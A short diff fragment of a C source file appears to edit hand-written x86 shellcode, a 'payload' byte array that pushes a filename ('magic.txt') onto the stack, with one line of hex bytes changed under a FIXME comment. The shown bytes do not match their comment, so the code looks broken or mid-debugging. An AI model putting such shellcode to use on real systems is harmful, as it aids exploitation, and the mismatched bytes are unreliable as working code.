@@ -25,7 +25,7 @@ unsigned char payload[] =
 	/* ------------------------------------	*/
 	/* FIXME */
 	/* ------------------------------------	*/
-   "\x68\x2F\x6E\x2F\x74"	// push "magic.txt"
+   "\x68\x6E\x2F\x0d\x74"	    // push "magic.txt"
    "\x68\x78\x74\x2E\x63"
    "\x68\x69\x67\x61\x6D"
    "\x89\xe3"               	//mov    %esp,%ebx
